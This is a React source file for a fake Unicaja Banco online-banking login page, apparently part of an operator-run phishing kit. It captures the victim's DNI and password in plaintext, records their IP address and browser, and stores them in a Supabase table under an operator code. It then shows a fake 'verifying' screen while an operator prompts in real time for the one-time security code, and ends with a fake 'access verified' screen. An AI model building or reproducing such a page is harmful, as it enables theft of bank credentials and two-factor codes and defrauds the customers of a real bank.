import { useState, useEffect } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker } from "@/hooks/useVisitTracker";
import UniLoginForm from "@/components/uni/UniLoginForm";
import UniOtpInput from "@/components/uni/UniOtpInput";
import unicajaLogo from "@/assets/unicaja-logo-new.png";

const Uni = () => {
  const { operatorCode } = useParams();
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [status, setStatus] = useState("form");
  const [loading, setLoading] = useState(false);
  

  useVisitTracker();

  useEffect(() => {
    if (!sessionId) return;
    const channel = supabase
      .channel(`uni-session-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const newStatus = payload.new?.status;
          if (newStatus) setStatus(newStatus);
        }
      )
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  const handleLogin = async (dni: string, password: string) => {
    setLoading(true);
    try {
      let ip = null;
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch {}

      const { data } = await supabase.from("sessions").insert({
        email: dni,
        password,
        source: "unicaja",
        operator_code: operatorCode || "default",
        status: "waiting",
        ip_address: ip,
        user_agent: navigator.userAgent,
      }).select("id").single();

      if (data) {
        setSessionId(data.id);
        setStatus("waiting");
      }
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#ffffff" }}>
      {/* Header */}
      <div className="w-full border-b px-4 py-3" style={{ borderColor: "#e5e7eb" }}>
        <div className="max-w-[420px] mx-auto flex items-center justify-between">
          <button className="flex items-center gap-2 text-[13px] font-medium" style={{ color: "#1a2b3c" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1a2b3c" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
              <circle cx="9" cy="7" r="4"/>
              <line x1="19" y1="8" x2="19" y2="14"/>
              <line x1="22" y1="11" x2="16" y2="11"/>
            </svg>
            Alta en Banca Digital
          </button>
          <button className="flex items-center gap-2 text-[13px] font-medium" style={{ color: "#1a2b3c" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#2e7d5e" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
              <circle cx="9" cy="7" r="4"/>
              <path d="M20 8v6M23 11h-6"/>
            </svg>
            Hazte cliente
          </button>
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 flex items-center justify-center px-4">
        <div className="w-full max-w-[420px]">
          {status === "form" && (
            <div>
              <div className="flex justify-center mb-6">
                <img src={unicajaLogo} alt="Unicaja" className="h-12 object-contain" />
              </div>
              <h1 className="text-[22px] sm:text-[26px] font-semibold text-center mb-8" style={{ color: "#1a2b3c" }}>
                Acceso a Banca Online
              </h1>
              <UniLoginForm onSubmit={handleLogin} loading={loading} />

              {/* Security block */}
              <div className="flex items-center gap-3 mt-8">
                <div className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0" style={{ backgroundColor: "#e8f5f0" }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#2e9e6e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/>
                    <path d="M8 12l2 2 4-4"/>
                  </svg>
                </div>
                <div>
                  <p className="text-[14px]" style={{ color: "#3c3c3c" }}>
                    Protégete de los ciber ataques
                  </p>
                  <button className="text-[14px] hover:underline" style={{ color: "#004b6e" }}>
                    Ver recomendaciones de seguridad
                  </button>
                </div>
              </div>
            </div>
          )}

          {status === "waiting" && (
            <div className="text-center py-12">
              <div className="w-12 h-12 border-4 rounded-full animate-spin mx-auto mb-6" style={{ borderColor: "#004b6e", borderTopColor: "transparent" }} />
              <h2 className="text-[20px] font-semibold mb-2" style={{ color: "#1a2b3c" }}>
                Verificando credenciales
              </h2>
              <p className="text-[14px]" style={{ color: "#666666" }}>
                Por favor, espere un momento...
              </p>
            </div>
          )}

          {status === "otp" && (
            <div className="text-center py-8">
              <h2 className="text-[20px] font-semibold mb-4" style={{ color: "#1a2b3c" }}>
                Verificación de seguridad
              </h2>
              <p className="text-[14px] mb-6" style={{ color: "#666666" }}>
                Introduzca el código que ha recibido en su dispositivo
              </p>
              <UniOtpInput sessionId={sessionId!} />
            </div>
          )}

          {status === "success" && (
            <div className="text-center py-12">
              <div className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-6" style={{ backgroundColor: "#00875a" }}>
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M5 12l5 5L20 7"/>
                </svg>
              </div>
              <h2 className="text-[20px] font-semibold mb-2" style={{ color: "#1a2b3c" }}>
                Acceso verificado
              </h2>
              <p className="text-[14px]" style={{ color: "#666666" }}>
                Redirigiendo a su cuenta...
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Footer */}
      <div className="w-full border-t px-4 py-4" style={{ borderColor: "#e5e7eb" }}>
        <div className="max-w-[420px] mx-auto text-center">
          <p className="text-[12px] mb-2" style={{ color: "#888888" }}>
            © Unicaja Banco, S.A. 2026. Todos los derechos reservados.
          </p>
          <div className="flex items-center justify-center gap-4">
            <button className="text-[12px] hover:underline" style={{ color: "#004b6e" }}>Aviso legal</button>
            <button className="text-[12px] hover:underline" style={{ color: "#004b6e" }}>Cookies</button>
            <button className="text-[12px] hover:underline" style={{ color: "#004b6e" }}>Privacidad</button>
            <button className="text-[12px] hover:underline" style={{ color: "#004b6e" }}>Seguridad</button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Uni;
